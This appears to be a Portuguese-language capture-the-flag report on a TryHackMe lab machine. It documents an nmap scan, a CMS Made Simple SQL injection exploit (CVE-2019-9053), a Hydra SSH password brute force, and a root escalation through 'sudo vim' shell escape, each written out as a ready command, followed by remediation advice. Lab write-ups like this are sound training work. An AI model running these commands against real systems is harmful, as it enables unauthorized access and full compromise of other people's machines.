# 1 — Visão geral da metodologia

1. **Objetivo:** comprovar comprometimento completo do alvo com exploração reprodutível.
    
2. **Estrutura:** Recon → Enumeração → Exploração SQLi → Acesso SSH → Privesc → Flags → Reporting.
    
3. **Princípios:** documentação completa de comandos, outputs e flags.
    

---

# Report — Máquina: `EasyCTF` — `10.65.133.249`

- **Fonte:** THM
    
- **Data:** `2025-11-28`
    
- **Autor:** _Enrico Moreno_
    
- **Nível:** Easy
    
- **Início:** 12:59
    
- **Tempo gasto:** _50 min_
    

---

## 1) Executive summary

Vulnerabilidade de **SQL Injection (CVE-2019-9053)** no CMS Made Simple resultou em extração de credenciais, acesso SSH como _mitch_ e elevação direta a root via `sudo vim`.

---

## 2) Escopo e limitações

- **Alvo testado:** `10.65.133.249`
    
- **Serviços expostos:** HTTP (80), SSH
    
- **Ferramentas utilizadas:** Nmap, searchsploit, exploit, Hydra, SSH, sudo
    
- **Limitações:** sem restrições do lab
    

---

## 3) Metodologia aplicada

- Recon: Identificação de CMS vulnerável
    
- Exploração SQLi: Dump de credenciais via exploit
    
- Brute-force auxiliado por Hydra
    
- Acesso ao sistema via SSH
    
- Privesc via `sudo vim` (NOPASSWD)
    
- Flags coletadas
    

---

## 4) Achado principal

**Vulnerabilidade:** SQL Injection — CVE-2019-9053  
**Local:** CMS Made Simple `< 2.2.10`  
**PoC:**

`python3 46635.py -u http://10.65.133.249/ -w /usr/share/wordlists/rockyou.txt`

**Resultado:**  
`username: mitch`  
`senha obtida via Hydra: secret`

**Shell root obtida** via `sudo vim`

---

## 5) Evidências / PoC (resumo)

**Scan inicial**

`sudo nmap -Pn -sS -sV -T4 -p- -O 10.65.133.249 -oN ~/Desktop/EasyCTF.txt`

**Exploit em SQLi (searchsploit 46635)**  
→ problemas na execução final do exploit

**Bruteforce com Hydra**

`hydra -l mitch -P /usr/share/wordlists/rockyou.txt -vV ssh://10.65.133.249`

→ senha: `secret`

**Acesso SSH**

`ssh mitch@10.65.133.249`

**Flag 1** → encontrada no user mitch

**Privesc com sudo**

`sudo -l`

Retorno:

`(root) NOPASSWD: /usr/bin/vim`

Exploit do sudo/vim:

`sudo vim -c ':set shell=/bin/bash' -c ':shell'`

→ root  
→ flag final coletada

---

## 6) Impacto & Severidade

**Severidade:** **Alta**  
A falha de SQLi possibilita vazamento de credenciais e acesso root sem barreiras adicionais. Comprometimento completo da máquina.

---

## 7) Reproduzir (passo-a-passo)

1. Descobrir serviços:
    

`sudo nmap -Pn -sS -sV -T4 -p- -O 10.65.133.249`

2. Identificar CMS e CVE
    
3. Rodar exploit SQLi (ou Hydra)
    
4. Acessar via SSH:
    

`ssh mitch@10.65.133.249`

5. Verificar privesc:
    

`sudo -l`

6. Executar privesc:
    

`sudo vim -c ':set shell=/bin/bash' -c ':shell'`

7. Coletar flags (user & root)
    

---

## 8) Recomendações (gestores)

- Atualizar CMS Made Simple para versão corrigida
    
- Revisar políticas de sudo e remover permissões sem senha
    
- Habilitar WAF com regras para SQL Injection
    

---

## 9) Recomendações técnicas

- Implementar prepared statements no backend
    
- Reforçar validações de input e sanitização de queries
    
- Auditoria completa de permissões sudo:
    

`visudo`

- Desabilitar módulos e interfaces desnecessárias
    

---

## 10) Apêndice técnico

### Exploit Referência

- `php/webapps/46635.py` — CMS Made Simple SQLi
    

### Services

- Apache 2.4.18 (Ubuntu)
    
- OpenSSH (versão identificada no scan)
    
### Nmap

Arquivo: 

![](EasyCTF.txt)

### Hydra

Arquivo: 

![](hydra_EasyCTF.txt)

---

## 11) Lições aprendidas / Follow-up

- SQLi continua sendo vetor dominante em webapps legados
    
- Senhas fracas × credenciais expostas = SSH facilmente comprometido
    
- Políticas de sudo devem ser revisadas continuamente
    

---